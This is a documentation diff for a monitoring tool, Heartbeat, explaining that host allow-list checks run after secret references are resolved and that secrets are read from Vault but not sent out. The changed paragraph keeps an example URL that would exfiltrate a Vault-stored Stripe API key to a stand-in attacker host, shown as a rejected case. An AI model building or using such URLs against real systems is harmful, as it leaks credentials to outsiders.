@@ -228,7 +228,7 @@ Hosts are compared as follows:
 * Internationalized host names are compared in their ASCII (Punycode) form, so `bücher.example` allows `xn--bcher-kva.example`.
 * Wildcards aren't supported.
 
-Heartbeat checks the hosts after it resolves the references, so the hosts that are checked are the ones the monitor connects to. For example, `https://attacker.example/?k=vault://prod@payments/stripe#api_key` is rejected because `attacker.example` is not allowed, and so is a URL or a host that comes from a secret and isn't in `allowed_hosts`.
+Heartbeat checks the hosts after it resolves the references, so it checks the hosts the monitor actually connects to, including hosts that come from secrets. For example, `https://attacker.example/?k=vault://prod@payments/stripe#api_key` is rejected because `attacker.example` isn't allowed.
 
 Because of this order, a monitor that fails the check still reads its secrets from Vault, at most once every 5 minutes for each secret. These reads appear in the Vault audit log. The secrets stay in Heartbeat and aren't sent to any host.
 
